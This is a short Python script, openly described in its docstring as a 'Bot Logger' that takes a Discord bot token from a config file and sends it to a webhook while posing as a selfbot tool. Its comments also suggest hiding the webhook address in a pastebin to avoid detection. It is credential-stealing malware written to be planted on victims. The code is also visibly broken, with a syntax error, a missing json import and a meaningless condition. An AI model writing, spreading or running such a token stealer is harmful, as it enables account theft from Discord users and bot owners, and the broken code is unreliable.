import requests

json_used = True
json_file = "config.json"

"""
Bot Logger
- Fetch Discord Bot Token
- Send to Webhook

Disguised as a tool for the selfbot to run.
Although they can simply regenerate their token, it is compatible with selfbots/userbots.

I'd recommend you use a pastebin for importing the webhook to make it undetectable.
"""

class discordian:
      def run(url, token):
          r = requests.post(
              url,
              json = {
                   "embeds": [
                           {
                             "title"      : "Token Fetched",
                             "description": "Token: `%s`" % (token)
                           }
                   ]
              }
          )

          if r.status_code in [200, 201, 203, 204]:
             print('[!] Shard: 1/69')

try:
   if "BOT USERNAME HERE" == "BOT USERNAME HERE":
      token   = json.load(open(json_file, 'r'))['TOKEN'] or json.load(open(json_file, 'r'))['token']:
      webhook = ""
      
      if token != None or "":
         discordian.run(
                   webhook,
                   token 
      )
except:
   print("[!] Couldn't Login")
